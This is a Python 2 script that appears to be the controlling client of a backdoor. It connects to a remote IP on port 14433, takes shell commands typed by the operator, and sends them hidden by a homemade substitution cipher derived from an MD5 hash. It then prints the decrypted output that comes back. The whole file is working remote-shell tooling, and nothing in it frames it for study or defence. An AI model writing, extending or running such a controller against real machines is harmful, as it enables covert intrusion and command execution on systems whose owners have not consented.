#!/usr/bin/python
import socket
import sys
import string
import struct
from hashlib import md5
from docopt import docopt
PORT = 14433            # The same port as used by the server


def get_table():
    m = md5()
    m.update('crack')
    s = m.digest()
    (a, b) = struct.unpack('<QQ', s)
    table = [c for c in string.maketrans('', '')]
    for i in xrange(1, 102):
        table.sort(lambda x, y: int(a % (ord(x) + i) - a % (ord(y) + i)))
    return table


encrypt_table = ''.join(get_table())
decrypt_table = string.maketrans(encrypt_table, string.maketrans('', ''))


def encrypt(data):
    return data.translate(encrypt_table)


def decrypt(data):
    return data.translate(decrypt_table)


def connect(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # connect to attacker machine
    s.connect((host, PORT))
    # send we are connected
    # start loop
    while 1:
        command = raw_input("Enter shell command or quit: ")
        if command == "quit": break
        s.send(encrypt(command))
        print decrypt(s.recv(1024))
    s.close()

def main():
    USAGE = """
    Usage:
        local --ip=<ip>

    Options:
        -i, --ip=ip
    """
    options = docopt(USAGE, argv=sys.argv[1:])
    ip = options['--ip']
    connect(ip)

if __name__ == '__main__':
    main()
